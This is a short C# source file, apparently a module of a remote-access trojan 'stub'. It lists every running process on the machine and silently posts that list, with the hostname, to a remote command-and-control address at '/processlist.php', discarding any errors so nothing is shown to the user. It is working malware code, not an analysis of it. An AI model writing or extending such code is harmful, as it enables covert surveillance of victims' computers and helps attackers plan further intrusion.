using System.Diagnostics;
using System.Net;

namespace stub
{
    internal class GetProcessList
    {
        static WebClient webclient = WebClientHandler.wcReturn();

        public static void FetchProcess()
        {
            string pclist = "";
            Process[] processlist = Process.GetProcesses();
            foreach (Process p in processlist)
            {
                pclist += p.ProcessName + " | " + p.Id + "\n";
            }
            try
            {
                webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/processlist.php", "client=" + Dns.GetHostName() + "&pclist=" + pclist);
            }
            catch { }
        }
    }
}
